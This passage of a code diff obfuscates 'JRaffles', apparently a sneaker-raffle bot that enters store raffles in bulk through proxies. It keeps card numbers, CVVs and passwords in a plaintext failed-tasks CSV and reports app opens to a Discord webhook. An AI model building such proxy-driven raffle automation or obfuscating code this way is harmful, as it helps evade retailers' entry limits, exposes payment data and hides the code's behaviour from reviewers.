+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Retrying\x20(' + _0xe77d21 + '\x20/\x205)')), _0x1d9900 = _0x1d9900 - 0x1, _0xe77d21 = _0xe77d21 + 0x1;
                                 continue;
                             }
-                            if (retry == 'yes' && t >= 5) {
-                                errorLog(csv[i], currentFunction)
-                                retry = 'no';
-                                t = 0;
-                            }
-                            console.log(`Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
+                            _0x26f424 == 'yes' && _0xe77d21 >= 0x5 && (_0x5925c7(_0x552d07[_0x1d9900], _0x30a5a4), _0x26f424 = 'no', _0xe77d21 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                         }
                     }
                 }
             }
         ]
     },
-
-    // {
-    //     name: 'Seven Store',
-    //     modules: [
-
-    //         {
-    //             name: 'Seven Store Raffle Entries'
-    //         }
-    //     ]
-    // },
     {
-        name: 'Failed Tasks',
-        modules: [
+        'name': 'Failed\x20Tasks',
+        'modules': [
             {
-                name: 'Retry Failed Tasks',
-                function: async function (currentFunction) {
-                    var proxies = await getProxyFile();
-                    var taskCSV = fs.readFileSync('../failed-tasks.csv', 'utf-8')
-                    var tasks = Papa.parse(taskCSV, { header: true }).data;
-                    for (var i = 0; i < tasks.length; i++) {
-                        var s = tasks[i].Store
-                        var m = tasks[i].Mode
-
-                        for (var stores of modules) {
-                            const isStore = stores.name.includes(s);
-                            if (!isStore) {
+                'name': 'Retry\x20Failed\x20Tasks',
+                'function': async function (_0x46c77c) {
+                    var _0x3a4f44 = await _0x1083d0(), _0x39c65d = _0x65e0bc['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x58f55c = _0x3e0e2d['parse'](_0x39c65d, { 'header': !![] })['data'];
+                    for (var _0xba2d09 = 0x0; _0xba2d09 < _0x58f55c['length']; _0xba2d09++) {
+                        var _0x2335cc = _0x58f55c[_0xba2d09]['Store'], _0x59321f = _0x58f55c[_0xba2d09]['Mode'];
+                        for (var _0x549214 of _0x1a1b7d) {
+                            const _0x16e494 = _0x549214['name']['includes'](_0x2335cc);
+                            if (!_0x16e494)
                                 continue;
-                            }
-                            for (mode of stores.modules) {
-                                // console.log(mode);
-                                if (mode.name == m) {
-                                    console.log(`Running ${chalk.cyan(mode.name)}`);
-
-
-                                    await mode.function(mode, [tasks[i]], proxies);
-                                    var lines = taskCSV.split('\n').splice(0, 1).join('\n');
-                                    fs.writeFileSync('../failed-tasks.csv', lines);
-
-
+                            for (mode of _0x549214['modules']) {
+                                if (mode['name'] == _0x59321f) {
+                                    console['log']('Running\x20' + _0x1403a4['cyan'](mode['name'])), await mode['function'](mode, [_0x58f55c[_0xba2d09]], _0x3a4f44);
+                                    var _0x4797eb = _0x39c65d['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
+                                    _0x65e0bc['writeFileSync']('../failed-tasks.csv', _0x4797eb);
                                 }
                             }
                         }
@@ -8818,588 +4810,379 @@ const modules = [
                 }
             },
             {
-                name: 'Clear Failed Tasks',
-                function: async function () {
-
-                    console.clear();
-                    console.log('Are you sure you want to clear "failed-tasks.csv"? (y/n)');
-                    var sure = await prompt.get('Answer');
-                    if (sure.Answer.toLowerCase() == 'y') {
-                        fs.writeFileSync('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\n');
-                        console.clear();
-                        console.log('Cleared Failed Tasks');
-                        await delay(1000);
+                'name': 'Clear\x20Failed\x20Tasks',
+                'function': async function () {
+                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
+                    var _0x372071 = await _0xab4dc6['get']('Answer');
+                    if (_0x372071['Answer']['toLowerCase']() == 'y') {
+                        _0x65e0bc['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x116d4a(0x3e8);
                         return;
                     }
-                    if (sure.Answer.toLowerCase() == 'n') {
-                        console.clear();
-
-                        console.log('Returning to Main Menu');
-                        await delay(1000);
+                    if (_0x372071['Answer']['toLowerCase']() == 'n') {
+                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x116d4a(0x3e8);
                         return;
                     }
-                    console.clear();
-
-                    console.log('Invalid Input');
-                    await delay(1000);
-                    return this.function();
-
+                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x116d4a(0x3e8), this['function']();
                 }
             }
         ]
     },
-    {
-        name: 'Paypal Verification'
-    },
-    {
-        name: 'Change Settings'
-    },
-    {
-        name: 'Reload Settings'
-    },
-
-    // {
-    //     name: 'BSTN ACCOUNT GENERATOR'
-    // },
-    // {
-    //     name: 'BSTN ACCOUNT VERIFIER'
-    // },
-    // {
-    //     name: 'BSTN RAFFLE'
-    // }
-]
-
-async function runFailedTasks(currentFunction) {
-    var proxies = await getProxyFile();
-    var taskCSV = fs.readFileSync('../failed-tasks.csv', 'utf-8')
-    var tasks = Papa.parse(taskCSV, { header: true }).data;
-    for (var i = 0; i < tasks.length; i++) {
-        var s = tasks[i].Store
-        var m = tasks[i].Mode
-        for (var stores of modules) {
-            const isStore = stores.name.includes(s);
-            if (isStore) {
-                for (mode of modules[stores].modules) {
-                    const isMode = mode.name.includes(m);
-                    if (isMode) {
-                        currentFunction = mode.name;
-                        await mode.function(currentFunction, tasks[i], proxies)
-                    }
+    { 'name': 'Paypal\x20Verification' },
+    { 'name': 'Change\x20Settings' },
+    { 'name': 'Reload\x20Settings' }
+];
+async function _0x4cdf9c(_0x381a57) {
+    var _0x174f3e = await _0x1083d0(), _0x3a1eea = _0x65e0bc['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x316e56 = _0x3e0e2d['parse'](_0x3a1eea, { 'header': !![] })['data'];
+    for (var _0x2a8e57 = 0x0; _0x2a8e57 < _0x316e56['length']; _0x2a8e57++) {
+        var _0x1a4553 = _0x316e56[_0x2a8e57]['Store'], _0x5a11e5 = _0x316e56[_0x2a8e57]['Mode'];
+        for (var _0x52d5a5 of _0x1a1b7d) {
+            const _0x5d93b9 = _0x52d5a5['name']['includes'](_0x1a4553);
+            if (_0x5d93b9)
+                for (mode of _0x1a1b7d[_0x52d5a5]['modules']) {
+                    const _0xa4725f = mode['name']['includes'](_0x5a11e5);
+                    _0xa4725f && (_0x381a57 = mode['name'], await mode['function'](_0x381a57, _0x316e56[_0x2a8e57], _0x174f3e));
                 }
-            }
         }
     }
 }
-
-async function main() {
-    await loadSettings();
-    console.clear();
-    if (settings.threads > 5) {
-        settings.threads = 5;
+async function _0x4556c9() {
+    await _0x2b1268(), console['clear']();
+    _0x51d52a['threads'] > 0x5 && (_0x51d52a['threads'] = 0x5);
+    if (_0x3b2d4c != 'devkey') {
+        let _0x3fbcbd = await _0x141a06['autoUpdate']();
+        if (_0x3fbcbd === 'yes')
+            return _0x5ddab8('node\x20JRaffles.js');
+        console['clear']();
     }
-    if (version != 'devkey') {
-        let didUpdate = await updater.autoUpdate();
-        if (didUpdate === 'yes') {
-            return exeCute('node JRaffles.js');
-        }
-        console.clear();
-    }
-    if (licenseKey == "") {
-        console.log('No key found in settings.json')
-        return await delay(10000);
+    if (_0x459e4e == '') {
+        console['log']('No\x20key\x20found\x20in\x20settings.json');
+        return await _0x116d4a(0x2710);
         ;
     }
-    await checkLicense(licenseKey);
-    if (auth === false) {
-        console.log(`Closing Browser`)
-        return await delay(3000);
-    } else {
+    await _0x22cdfb(_0x459e4e);
+    if (_0x471b05 === ![])
+        return console['log']('Closing\x20Browser'), await _0x116d4a(0xbb8);
+    else
         try {
-
-            var openEmbed = [
-                {
-                    "type": "rich",
-                    "title": `User Opened JRaffles`,
-                    "description": "",
-                    "color": 0xc0d6d6,
-                    "fields": [
-                        {
-                            "name": `User`,
-                            "value": `${username}`
-                        },
-                        {
-                            "name": `Version`,
-                            "value": `${version}`
-                        }
-                    ]
-                }
-            ]
-            const openMSG = { embeds: openEmbed };
-            var openDEV = await makeEmbed(null, null, 'open', false);
-
-            const EMBEDS =
-            {
-                openDEVMSG: { embeds: [openDEV] }
-            };
-            await sendWebhook(openWH, EMBEDS.openDEVMSG)
-            async function menu() {
-                setTitle(`JRaffles ${version}`);
-                console.clear();
-                // figlet('JRaffles', function (err, data) {
-                //     if (err) {
-                //         console.log('Something went wrong...');
-                //         console.dir(err);
-                //         return;
-                //     }
-                //     console.log(data)
-                // });
-                // await delay(1000)
-                console.log(`Hello ${chalk.cyan(`${username}`)}, Welcome to JRaffles ${version}`)
-                console.log('Choose a Module to run..\n');
-                for (var m = 0; m < modules.length - 4; m++) {
-                    if (m >= 10) {
-                        console.log(` (${m}) [${modules[m].name}]`)
+            var _0x443e34 = [{
+                'type': 'rich',
+                'title': 'User\x20Opened\x20JRaffles',
+                'description': '',
+                'color': 0xc0d6d6,
+                'fields': [
+                    {
+                        'name': 'User',
+                        'value': '' + _0x358285
+                    },
+                    {
+                        'name': 'Version',
+                        'value': '' + _0x3b2d4c
+                    }
+                ]
+            }];
+            const _0x48e850 = { 'embeds': _0x443e34 };
+            var _0xe19441 = await _0x2520f4(null, null, 'open', ![]);
+            const _0x30de1c = { 'openDEVMSG': { 'embeds': [_0xe19441] } };
+            await _0x3c7bbe(_0x58a2d0, _0x30de1c['openDEVMSG']);
+            async function _0x1748f7() {
+                _0x244762('JRaffles\x20' + _0x3b2d4c), console['clear'](), console['log']('Hello\x20' + _0x1403a4['cyan']('' + _0x358285) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x3b2d4c), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
+                for (var _0x3f7d2c = 0x0; _0x3f7d2c < _0x1a1b7d['length'] - 0x4; _0x3f7d2c++) {
+                    if (_0x3f7d2c >= 0xa) {
+                        console['log']('\x20(' + _0x3f7d2c + ')\x20[' + _0x1a1b7d[_0x3f7d2c]['name'] + ']');
                         continue;
                     }
-                    if (modules[m].name === 'Reload Settings' || modules[m].name === 'Change Settings') {
+                    if (_0x1a1b7d[_0x3f7d2c]['name'] === 'Reload\x20Settings' || _0x1a1b7d[_0x3f7d2c]['name'] === 'Change\x20Settings')
                         continue;
-                    } else {
-
-                        console.log(` (${m})  [${modules[m].name}]`)
-                    }
-                };
-                console.log(`\n ----------------------------------------------------- \n`)
-
-                console.log(` (${modules.length - 4}) Failed Tasks`)
-                console.log(` (${modules.length - 3}) Paypal Verification`)
-                console.log(` (${modules.length - 2}) Change Settings`)
-                console.log(` (${modules.length - 1}) Reload Settings`)
-                console.log(``);
-                taskModule = await getModule();
-                if (taskModule > modules.length - 1 || isNaN(taskModule) == true) {
-                    console.log('Invalid selection');
-                    await delay(1000);
-                    return menu();
+                    else
+                        console['log']('\x20(' + _0x3f7d2c + ')\x20\x20[' + _0x1a1b7d[_0x3f7d2c]['name'] + ']');
                 }
-                if (modules[taskModule].name == 'BSTN') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
+                ;
+                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1a1b7d['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x1a1b7d['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x1a1b7d['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1a1b7d['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x48764d();
+                if (taskModule > _0x1a1b7d['length'] - 0x1 || isNaN(taskModule) == !![])
+                    return console['log']('Invalid\x20selection'), await _0x116d4a(0x3e8), _0x1748f7();
+                if (_0x1a1b7d[taskModule]['name'] == 'BSTN') {
+                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                    console['clear']();
                     try {
-                        if (taskFunction == 3) {
-                            var proxies = await getProxyFile();
-                            await currentFunction.function(currentFunction, proxies)
+                        if (taskFunction == 0x3) {
+                            var _0x237df0 = await _0x1083d0();
+                            await _0x460411['function'](_0x460411, _0x237df0);
                         }
-                        if (taskFunction == 2) {
-                            var proxies = await getProxyFile();
-                            var bstn = await getTaskFile(currentFunction);
-                            if (settings.shuffleTasks) {
-                                await shuffle(bstn)
-                            }
-                            await currentFunction.function(currentFunction, bstn, proxies)
-                        } else if (taskFunction == 0) {
-                            var proxies = await getProxyFile();
-                            var bstn = await getTaskFile(currentFunction);
-                            if (settings.shuffleTasks) {
-                                await shuffle(bstn)
-                            }
-                            await currentFunction.function(currentFunction, bstn, proxies)
-                        } else if (taskFunction == 1) {
-                            var proxies = await getProxyFile();
-                            // var linksRaw = await getLinks();
-                            // var links = linksRaw.split(';');
-                            await currentFunction.function(currentFunction, proxies);
-                        }
-                    } catch (e) {
-                        console.log(e)
-                        await delay(2000);
-                    }
-                    return menu();
-                }
-                if (modules[taskModule].name == 'FENOM') {
-                    try {
-
-                        taskFunction = await getFunction(modules[taskModule].modules);
-                        var currentFunction = modules[taskModule].modules[taskFunction];
-                        console.clear();
-                        if (taskFunction == 1) {
-                            var proxies = await getProxyFile();
-                            var fenom = await getTaskFile(currentFunction);
-                            if (settings.shuffleTasks) {
-                                await shuffle(fenom)
-                            }
-                            await currentFunction.function(currentFunction, fenom, proxies)
-                        } else if (taskFunction == 0) {
-                            var proxies = await getProxyFile();
-                            var fenom = await getTaskFile(currentFunction);
-                            if (settings.shuffleTasks) {
-                                await shuffle(fenom)
-                            }
-                            await currentFunction.function(currentFunction, fenom, proxies)
-                        }
-                    } catch (e) {
-                        console.log(e);
-                        await delay(4000);
-                    }
-                    return menu();
-                }
-                if (modules[taskModule].name == 'Overkill') {
-                    try {
-
-                        taskFunction = await getFunction(modules[taskModule].modules);
-                        var currentFunction = modules[taskModule].modules[taskFunction];
-                        console.clear();
-                        if (taskFunction == 1) {
-                            var proxies = await getProxyFile();
-                            var fenom = await getTaskFile(currentFunction);
-                            if (settings.shuffleTasks) {
-                                await shuffle(fenom)
-                            }
-                            await currentFunction.function(currentFunction, fenom, proxies)
-                        } else if (taskFunction == 0) {
-                            var proxies = await getProxyFile();
-                            var fenom = await getTaskFile(currentFunction);
-                            if (settings.shuffleTasks) {
-                                await shuffle(fenom)
-                            }
-                            await currentFunction.function(currentFunction, fenom, proxies)
-                        }
-                    } catch (e) {
-                        console.log(e);
-                        await delay(4000);
-                    }
-                    return menu();
-                }
-                if (modules[taskModule].name == '4ELEMENTOS') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    if (taskFunction == 1) {
-                        var proxies = await getProxyFile();
-                        await currentFunction.function(currentFunction, proxies);
-                        return menu();
-                    }
-                    var proxies = await getProxyFile();
-                    var afew = await getTaskFile(currentFunction);
-                    if (settings.shuffleTasks) {
-                        await shuffle(afew)
-                    }
-                    await currentFunction.function(currentFunction, afew, proxies);
-                    return menu();
-                }
-                if (modules[taskModule].name == 'OneBlockDown') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    var proxies = await getProxyFile();
-                    var afew = await getTaskFile(currentFunction);
-                    if (settings.shuffleTasks) {
-                        await shuffle(afew)
-                    }
-                    await currentFunction.function(currentFunction, afew, proxies);
-                    return menu();
-                }
-                if (modules[taskModule].name == 'AFEW Store') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    var proxies = await getProxyFile();
-                    var afew = await getTaskFile(currentFunction);
-                    if (settings.shuffleTasks) {
-                        await shuffle(afew)
-                    }
-                    await currentFunction.function(currentFunction, afew, proxies);
-                    return menu();
-                }
-                if (modules[taskModule].name == 'EQL') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    var proxies = await getProxyFile();
-                    var afew = await getTaskFile(currentFunction);
-                    if (settings.shuffleTasks) {
-                        await shuffle(afew)
-                    }
-                    await currentFunction.function(currentFunction, afew, proxies);
-                    return menu();
-                }
-                else if (modules[taskModule].name == 'MAHA Amsterdam') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    if (taskFunction == 0) {
-                        var proxies = await getProxyFile();
-                        var oqium = await getTaskFile(currentFunction);
-                        if (settings.shuffleTasks) {
-                            await shuffle(oqium)
-                        }
-                        await currentFunction.function(currentFunction, oqium, proxies);
-
-                        return menu();
-                    } else if (taskFunction == 1) {
-                        var proxies = await getProxyFile();
-                        // console.log('Use the JRaffles Chrome Extension to copy your links here..');
-                        // linksRaw = await getLinks();
-                        // links = linksRaw.split(";");
-                        // console.log(`${links.length} links found!`);
-                        // console.log(`Starting verification..`);
-                        await currentFunction.function(currentFunction, null, proxies);
-
-                        return menu();
-                    };
-                } else if (modules[taskModule].name == 'FOOTSHOP') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    var proxies = await getProxyFile();
-                    var footshop = await getTaskFile(currentFunction);
-                    if (settings.shuffleTasks) {
-                        await shuffle(footshop)
-                    }
-                    await currentFunction.function(currentFunction, footshop, proxies);
-                    await delay(5000);
-                    return menu();
-                } else if (modules[taskModule].name == 'Google Forms') {
-                    try {
-                        let config = {
-                            headers: {
-                                'content-type': 'application/json',
-                            }
-                        }
-                        let data = {
-                            key: licenseKey
-                        }
-                        let response = await axios.post('https://jraffles.herokuapp.com/beta', data, config);
-                        if (response.status != 200) {
-                            throw new Error('No Beta Access..')
-                        }
-                        console.log(`Hello, ${chalk.cyan(username)}. Beta Access Granted.`)
-                        await delay(1000)
-                    } catch (e) {
-                        console.log('No Beta Access.')
-                        await delay(2000)
-                        return menu();
-                    }
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    var proxies = await getProxyFile();
-                    var footshop = await getTaskFile(currentFunction);
-                    if (settings.shuffleTasks) {
-                        await shuffle(footshop)
-                    }
-                    await currentFunction.function(currentFunction, footshop, proxies);
-                    await delay(5000);
-                    return menu();
-                } else if (modules[taskModule].name == 'OQIUM Store') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    if (taskFunction == 0) {
-                        var proxies = await getProxyFile();
-                        var oqium = await getTaskFile(currentFunction);
-                        if (settings.shuffleTasks) {
-                            await shuffle(oqium)
-                        }
-                        await currentFunction.function(currentFunction, oqium, proxies);
-
-                        return menu();
-                    } else if (taskFunction == 1) {
-                        var proxies = await getProxyFile();
-                        // console.log('Use the JRaffles Chrome Extension to copy your links here..');
-                        // linksRaw = await getLinks();
-                        // links = linksRaw.split(";");
-                        // console.log(`${links.length} links found!`);
-                        // console.log(`Starting verification..`);
-                        await currentFunction.function(currentFunction, null, proxies);
-
-                        return menu();
-                    };
-                } else if (modules[taskModule].name == 'BOUNCEWEAR') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    if (taskFunction == 0) {
-                        await bwAcc(`https://bouncewear.com/nl/account/register`, currentFunction);
-                    } else if (taskFunction == 1) {
-
-                    };
-                } else if (modules[taskModule].name == 'PATTA') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    if (taskFunction == 0) {
-                        var proxies = await getProxyFile();
-                        var patta = await getTaskFile(currentFunction);
-                        if (settings.shuffleTasks) {
-                            await shuffle(patta)
-                        }
-                        await currentFunction.function(currentFunction, patta, proxies);
-                        return menu();
-                    } else if (taskFunction == 1) {
-                        var proxies = await getProxyFile();
-                        var patta = await getTaskFile(currentFunction);
-                        if (settings.shuffleTasks) {
-                            await shuffle(patta)
-                        }
-                        await currentFunction.function(currentFunction, patta, proxies);
-                        return menu();
-                    };
-                } else if (modules[taskModule].name == 'SLAM JAM') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    if (taskFunction == 0) {
-                        var proxies = await getProxyFile();
-                        var slamjam = await getTaskFile(currentFunction);
-                        if (settings.shuffleTasks) {
-                            await shuffle(slamjam)
-                        }
-                        await currentFunction.function(currentFunction, slamjam, proxies);
-                        return menu();
-                    } else if (taskFunction == 1) {
-                        var proxies = await getProxyFile();
-                        var slamjam = await getTaskFile(currentFunction);
-                        if (settings.shuffleTasks) {
-                            await shuffle(slamjam)
-                        }
-                        await currentFunction.function(currentFunction, slamjam, proxies);
-                        return menu();
-                    };
-                    // console.log('inalid selection')
-                    // return menu()
-                } else if (modules[taskModule].name == 'KICKZ') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    if (taskFunction == 0) {
-                        var proxies = await getProxyFile();
-                        var kickz = await getTaskFile(currentFunction);
-                        if (settings.shuffleTasks) {
-                            await shuffle(kickz)
-                        }
-                        await currentFunction.function(currentFunction, kickz, proxies);
-                        return menu();
-                    } else if (taskFunction == 1) {
-                        var proxies = await getProxyFile();
-                        var kickz = await getTaskFile(currentFunction);
-                        if (settings.shuffleTasks) {
-                            await shuffle(kickz)
-                        }
-                        await currentFunction.function(currentFunction, kickz, proxies);
-                        return menu();
-                    };
-                } else if (modules[taskModule].name == 'JD') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-                    console.clear();
-                    if (taskFunction == 0) {
-                        var proxies = await getProxyFile();
-                        var jd = await getTaskFile(currentFunction);
-                        if (settings.shuffleTasks) {
-                            await shuffle(jd)
-                        }
-                        await currentFunction.function(currentFunction, jd, proxies);
-                        return menu();
-                    }
-                } else if (modules[taskModule].name == 'Seven Store') {
-                    // taskFunction = await getFunction(modules[taskModule].modules);
-                    // var currentFunction = modules[taskModule].modules[taskFunction];
-                    // console.clear();
-                    // if (taskFunction == 0) {
-                    //     var proxies = await getProxyFile();
-                    //     var seven = await getTaskFile();
-                    //     await sevenFunction(currentFunction, seven, proxies);
-                    //     return menu();
-                    // }
-                    console.log('returning to menu')
-                    await delay(1000)
-                    return menu();
-                } else if (modules[taskModule].name == 'Paypal Verification') {
-                    var f = modules[taskModule].name
-                    var proxies = await getProxyFile();
-                    // const linksRaw = await getLinks();
-                    // var links = linksRaw.split(';');
-                    await paypalFunction(f, proxies);
-                    return menu();
-                } else if (modules[taskModule].name == 'Failed Tasks') {
-                    taskFunction = await getFunction(modules[taskModule].modules);
-
-                    var currentFunction = modules[taskModule].modules[taskFunction];
-
-                    await currentFunction.function(currentFunction);
-
-                    return menu();
-                } else if (modules[taskModule].name == 'Change Settings') {
-                    console.log(`Choose a Setting to change :\n`);
-                    var s = 0;
-                    for (const properties in settings) {
-                        console.log(`(${s}) ${properties} : ${settings[properties]}`);
-                        s++;
-                    }
-                    console.log('\n ----------------------------------------------------- \n');
-                    console.log(`(${s}) Return to Main Menu`);
-                    var changeSetting = await getSetting();
-                    if (changeSetting == s) {
-                        return menu();
-                    }
-                    console.clear;
-                    var c = 0;
-                    for (var properties in settings) {
-                        if (changeSetting == c) {
-                            console.log(`Changing: \n \n ${properties} :`);
-                            settings[properties] = await getValue();
-                            fs.writeFileSync('../settings.json', JSON.stringify(settings))
-                            break;
+                        if (taskFunction == 0x2) {
+                            var _0x237df0 = await _0x1083d0(), _0x19e3f7 = await _0xb9dc1e(_0x460411);
+                            _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x19e3f7), await _0x460411['function'](_0x460411, _0x19e3f7, _0x237df0);
                         } else {
-                            c++;
+                            if (taskFunction == 0x0) {
+                                var _0x237df0 = await _0x1083d0(), _0x19e3f7 = await _0xb9dc1e(_0x460411);
+                                _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x19e3f7), await _0x460411['function'](_0x460411, _0x19e3f7, _0x237df0);
+                            } else {
+                                if (taskFunction == 0x1) {
+                                    var _0x237df0 = await _0x1083d0();
+                                    await _0x460411['function'](_0x460411, _0x237df0);
+                                }
+                            }
+                        }
+                    } catch (_0x391d92) {
+                        console['log'](_0x391d92), await _0x116d4a(0x7d0);
+                    }
+                    return _0x1748f7();
+                }
+                if (_0x1a1b7d[taskModule]['name'] == 'FENOM') {
+                    try {
+                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                        console['clear']();
+                        if (taskFunction == 0x1) {
+                            var _0x237df0 = await _0x1083d0(), _0x5daa7a = await _0xb9dc1e(_0x460411);
+                            _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5daa7a), await _0x460411['function'](_0x460411, _0x5daa7a, _0x237df0);
+                        } else {
+                            if (taskFunction == 0x0) {
+                                var _0x237df0 = await _0x1083d0(), _0x5daa7a = await _0xb9dc1e(_0x460411);
+                                _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5daa7a), await _0x460411['function'](_0x460411, _0x5daa7a, _0x237df0);
+                            }
+                        }
+                    } catch (_0x3016d9) {
+                        console['log'](_0x3016d9), await _0x116d4a(0xfa0);
+                    }
+                    return _0x1748f7();
+                }
+                if (_0x1a1b7d[taskModule]['name'] == 'Overkill') {
+                    try {
+                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                        console['clear']();
+                        if (taskFunction == 0x1) {
+                            var _0x237df0 = await _0x1083d0(), _0x5daa7a = await _0xb9dc1e(_0x460411);
+                            _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5daa7a), await _0x460411['function'](_0x460411, _0x5daa7a, _0x237df0);
+                        } else {
+                            if (taskFunction == 0x0) {
+                                var _0x237df0 = await _0x1083d0(), _0x5daa7a = await _0xb9dc1e(_0x460411);
+                                _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5daa7a), await _0x460411['function'](_0x460411, _0x5daa7a, _0x237df0);
+                            }
+                        }
+                    } catch (_0x2dc775) {
+                        console['log'](_0x2dc775), await _0x116d4a(0xfa0);
+                    }
+                    return _0x1748f7();
+                }
+                if (_0x1a1b7d[taskModule]['name'] == '4ELEMENTOS') {
+                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                    console['clear']();
+                    if (taskFunction == 0x1) {
+                        var _0x237df0 = await _0x1083d0();
+                        return await _0x460411['function'](_0x460411, _0x237df0), _0x1748f7();
+                    }
+                    var _0x237df0 = await _0x1083d0(), _0x4487e4 = await _0xb9dc1e(_0x460411);
+                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x4487e4), await _0x460411['function'](_0x460411, _0x4487e4, _0x237df0), _0x1748f7();
+                }
+                if (_0x1a1b7d[taskModule]['name'] == 'OneBlockDown') {
+                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                    console['clear']();
+                    var _0x237df0 = await _0x1083d0(), _0x4487e4 = await _0xb9dc1e(_0x460411);
+                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x4487e4), await _0x460411['function'](_0x460411, _0x4487e4, _0x237df0), _0x1748f7();
+                }
+                if (_0x1a1b7d[taskModule]['name'] == 'AFEW\x20Store') {
+                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                    console['clear']();
+                    var _0x237df0 = await _0x1083d0(), _0x4487e4 = await _0xb9dc1e(_0x460411);
+                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x4487e4), await _0x460411['function'](_0x460411, _0x4487e4, _0x237df0), _0x1748f7();
+                }
+                if (_0x1a1b7d[taskModule]['name'] == 'EQL') {
+                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                    console['clear']();
+                    var _0x237df0 = await _0x1083d0(), _0x4487e4 = await _0xb9dc1e(_0x460411);
+                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x4487e4), await _0x460411['function'](_0x460411, _0x4487e4, _0x237df0), _0x1748f7();
+                } else {
+                    if (_0x1a1b7d[taskModule]['name'] == 'MAHA\x20Amsterdam') {
+                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
